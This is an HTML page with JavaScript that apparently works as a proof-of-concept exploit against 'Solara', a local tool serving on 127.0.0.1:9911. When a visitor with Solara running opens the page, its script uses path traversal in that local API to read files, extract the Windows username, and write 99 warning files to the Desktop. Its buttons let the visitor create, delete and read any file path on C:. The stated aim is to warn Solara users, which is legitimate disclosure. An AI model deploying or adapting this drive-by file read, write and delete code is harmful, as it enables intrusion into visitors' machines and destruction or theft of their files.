<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solara</title>
</head>
<body>
    <style>
        body {
            background-color: #000000;
            color: #ecebeb;
        }

        input, button {
            background-color: #2c2c2c;
            color: #ecebeb;
            border: 0px;
            font-size: 16px;
            padding: 6px;
        }

        #console {
            background-color: #2c2c2c;
            margin-top: 17px;
            padding: 3px;
        }

        p {
            margin: 0px;
            padding: 0px;
        }
    </style>
    
    <div id="controls">
        <input type="text" name="" id="fpath" placeholder="File Path">
        <input type="text" name="" id="fcontent" placeholder="Content">
        <button onclick="InputCreateFile()">Create File</button>
        <button onclick="InputDeleteFile()">Delete File</button>
        <button onclick="InputReadFile()">Read File</button>
        <button onclick="InputClearConsole()">Clear Console</button>
    </div>

    <div id="console">
        <p id="log"></p>
    </div>

    <script>
        const fpath    = document.getElementById("fpath");
        const content  = document.getElementById("fcontent");
        const con      = document.getElementById("console");
        const log      = document.getElementById("log");

        let SOLARA_CONNECTED;

        function print(...args) {
            const clone = log.cloneNode();
            clone.textContent = `[${new Date().toLocaleString().split(", ").pop()}] ${args.join(" ")}`;
            con.appendChild(clone);
        }

        async function GetSolaraTabs() {
            return new Promise(async (resolve, reject) => {
                try {
                    const packet = await fetch("http://127.0.0.1:9911/files");
                    if (packet.status != 200) 
                        return reject();

                    const response = await packet.json();
                    resolve(response);
                } catch (er) {
                    console.log(er);
                    resolve();
                }
            });
        }

        async function ReadFile(name) {
            return new Promise(async (resolve, reject) => {
                try {
                    const packet = await fetch(`http://127.0.0.1:9911/opentab/${encodeURIComponent(name)}`);
                    if (packet.status != 200)
                        return reject();

                    const response = await packet.text();
                    resolve(response);
                } catch (er) {
                    console.log(er);
                    resolve();
                }
            });
        }
        
        async function DeleteFile(name) {
            return new Promise(async (resolve, reject) => {
                try {
                    const packet = await fetch(`http://127.0.0.1:9911/delete/${encodeURIComponent(name)}`, {
                        method: "DELETE"
                    });

                    if (packet.status != 200) 
                        return reject();

                    resolve();
                } catch (er) {
                    console.log(er);
                    resolve();
                }
            });
        }

        async function CreateFile(name, body) {
            return new Promise(async (resolve, reject) => {
                try {
                    const packet = await fetch(`http://127.0.0.1:9911/savetab/${encodeURIComponent(name)}`, {
                        method: "POST",
                        body
                    });

                    if (packet.status != 200) 
                        return reject();

                    resolve();
                } catch (er) {
                    console.log(er);
                    resolve();
                }
            });
        }

        async function onconnect() {
            const tabs = await GetSolaraTabs();
            for (let tab of tabs) {
                print(`Script Tab: name: ${tab.name}, createdAt: ${tab.createdAt}, path: C:\\SolaraTab\\${tab.name}`);
            }

            const path = await ReadFile("../ProgramData\\Solara\\bin\\path.txt");
            const username = path.match(/Users\\(.*?)\\/).pop().trim();

            print(`Solara Path: ${path}`);
            print(`Windows Username: ${username}`);

            for (let i=1; i < 100; i++) {
                await CreateFile(`../Users\\User\\Desktop\\README-${i}.txt`, `Warning! You are running an insecure exploit aka "Solara"\nLocated: ${path}\n\n!! Just by having the UI open allows an attacker to access your operating system, files, and personal information.\nWe recommend deleting solara!\n\nhttps://linkguard.cc/solara.html`)
            }

            print(`Created Warnings!`);
        }

        async function InputCreateFile() {
            if (!SOLARA_CONNECTED) return print("Solara is not connected");

            try {
                await CreateFile(`../${fpath.value}`, content.value);
                print(`Created file at: C:/${fpath.value}`);
            } catch (er) {
                print(`Failed to create file at: C:/${fpath.value}`);
            }
        }

        async function InputDeleteFile() {
            if (!SOLARA_CONNECTED) return print("Solara is not connected");
            
            try {
                await DeleteFile(`../${fpath.value}`);
                print(`Deleted file at: C:/${fpath.value}`);
            } catch (er) {
                print(`Failed to delete file at: C:/${fpath.value}`);
            }
        }

        async function InputReadFile() {
            if (!SOLARA_CONNECTED) return print("Solara is not connected");
            
            try {
                const content = await ReadFile(`../${fpath.value}`);
                print(`Reading file at: C:/${fpath.value}`);
                print(content);
            } catch (er) {
                print(`Failed to read file at: C:/${fpath.value}`);
            }
        }

        function InputClearConsole() {
            con.innerHTML = "";
        }

        print("Waiting for Solara...");

        setInterval(async () => {
            const tabs = await GetSolaraTabs();
            if (tabs && SOLARA_CONNECTED) return;

            if (!tabs && SOLARA_CONNECTED) {
                SOLARA_CONNECTED = false;
                return print("Disconnected from Solara");
            }

            if (tabs && !SOLARA_CONNECTED) {
                SOLARA_CONNECTED = true;
                print("Connected to Solara");
                await onconnect();
            }
        }, 2000);
    </script>
</body>
</html>